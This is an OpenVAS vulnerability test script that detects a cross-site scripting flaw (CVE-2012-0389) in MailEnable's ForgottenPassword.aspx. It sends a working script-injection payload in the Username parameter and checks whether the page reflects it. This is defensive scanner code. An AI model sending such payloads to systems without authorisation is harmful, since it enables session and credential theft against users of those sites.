###############################################################################
# OpenVAS Vulnerability Test
#
# MailEnable 'ForgottonPassword.aspx' Cross Site Scripting Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103388");
  script_version("2020-08-24T15:18:35+0000");
  script_bugtraq_id(51401);
  script_cve_id("CVE-2012-0389");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2012-01-13 10:03:24 +0100 (Fri, 13 Jan 2012)");
  script_name("MailEnable 'ForgottonPassword.aspx' Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51401");
  script_xref(name:"URL", value:"http://www.mailenable.com/kb/Content/Article.asp?ID=me020567");

  script_tag(name:"summary", value:"MailEnable is prone to a cross-site scripting vulnerability because it
  fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker may leverage this issue to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected
  site. This may allow the attacker to steal cookie-based authentication
  credentials and launch other attacks.");

  script_tag(name:"affected", value:"The following MailEnable versions are vulnerable:

  Professional, Enterprise, and Premium 4.26 and prior versions

  Professional, Enterprise, and Premium 5.52 and prior versions

  Professional, Enterprise, and Premium 6.02 and prior versions");

  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for details.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_asp( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/mail", "/webmail", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/Mondo/lang/sys/login.aspx";

  if( http_vuln_check( port:port, url:url, pattern:"<title>MailEnable" ) ) {

    url = dir + "/Mondo/lang/sys/ForgottenPassword.aspx?Username=></script><script>alert(/xss-test/)</script>";

    if( http_vuln_check( port:port, url:url, pattern:"<script>alert\(/xss-test/\)</script>", check_header:TRUE ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
